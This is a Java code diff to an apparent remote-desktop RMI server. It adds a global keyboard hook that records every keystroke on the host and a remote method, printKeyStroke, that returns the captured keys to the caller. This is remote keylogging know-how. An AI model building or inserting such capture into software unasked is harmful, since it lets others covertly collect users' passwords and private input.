@@ -30,13 +30,16 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
 
   private Robot mr_robot;
   private OperatingSystemMXBean os;
-//  private K
-
+  private GlobalKeyboardHook keyboard;
+  private ArrayList<String> listText;
 
   public RemoteDesktopImpl() throws RemoteException, AWTException {
     super();
     this.mr_robot = new Robot();
     this.os = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
+    this.keyboard = new GlobalKeyboardHook(true);
+    this.listText = new ArrayList<>();
+    this.listText.clear();
   }
 
   @Override
@@ -250,20 +253,24 @@ public class RemoteDesktopImpl extends UnicastRemoteObject implements IRemoteDes
   }
 
   @Override
-  public ArrayList<String> getKeystroke(ArrayList<String> keyList) throws RemoteException {
-    ArrayList<String> a = new ArrayList<>();
-    GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
-    keyboardHook.addKeyListener(new GlobalKeyAdapter() {
+  public void getKeystroke(ArrayList<String> list) throws RemoteException {
+    this.keyboard = new GlobalKeyboardHook(true);
+    this.listText = list;
+    this.keyboard.addKeyListener(new GlobalKeyAdapter() {
       @Override
       public void keyPressed(GlobalKeyEvent event) {
         System.out.println(new Date() + " " + event.getKeyChar());
-        a.add(String.valueOf(event.getKeyChar()));
+        action(String.valueOf(event.getKeyChar()));
       }
-
+      public void action(String str) {
+        listText.add(str);
+      }
     });
-    System.out.println("Keyy" + a.toString());
+  }
 
-    return a;
+  @Override
+  public ArrayList<String> printKeyStroke() throws RemoteException {
+    return this.listText;
   }
 
   @Override
